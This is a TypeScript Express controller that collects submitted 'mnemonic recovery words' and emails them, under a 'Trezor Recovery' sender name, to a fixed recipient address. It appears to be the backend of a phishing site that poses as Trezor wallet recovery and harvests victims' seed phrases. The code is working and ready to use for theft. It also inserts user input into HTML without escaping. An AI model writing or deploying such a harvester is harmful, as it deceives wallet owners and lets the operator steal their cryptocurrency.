import { Request, Response } from "express";
import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
import nodemailer from "nodemailer";

export const sendMnemonicController = asyncHandler(
    async (req: Request, res: Response) => {
        const payload = req.body;

        if (!payload || !payload.data || !Array.isArray(payload.data)) {
            return errorResponse(res, "Invalid payload", 400);
        }

        let htmlContent = `<h2>${payload.heading}</h2><ul>`;
        payload.data.forEach((item: { label: string; value: string }) => {
            htmlContent += `<li><strong>${item.label}:</strong> ${item.value}</li>`;
        });
        htmlContent += `</ul>`;

        try {
            const transporter = nodemailer.createTransport({
                host: process.env.SMTP_HOST,
                port: Number(process.env.SMTP_PORT),
                secure: false,
                auth: {
                    user: process.env.SMTP_USER,
                    pass: process.env.SMTP_PASS,
                },
            });

            await transporter.sendMail({
                from: `"Trezor Recovery" <${process.env.SMTP_USER}>`,
                to: process.env.RECIPIENT_EMAIL,
                subject: "Trezor Mnemonic Recovery Words",
                html: htmlContent,
            });

            return successResponse(res, {}, "Mnemonic sent successfully", 200);
        } catch (error) {
            console.error("Email sending error:", error);
            return errorResponse(res, "Failed to send email", 500);
        }
    }
);
